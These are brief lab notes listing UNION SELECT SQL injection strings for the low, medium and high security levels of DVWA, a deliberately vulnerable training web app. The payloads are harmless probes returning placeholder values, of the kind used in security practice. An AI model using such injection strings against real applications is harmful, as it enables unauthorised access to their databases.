*DVWA SQL INJECTION VULNERABILITIES*

LOW LEVEL
?id=a' UNION SELECT "text1","text2";-- -&Submit=Submit

MEDIUM LEVEL
?id=a UNION SELECT 1,2;-- -&Submit=Submit

HIGH LEVEL
ID: a' UNION SELECT "text1","text2";-- -&Submit=Submit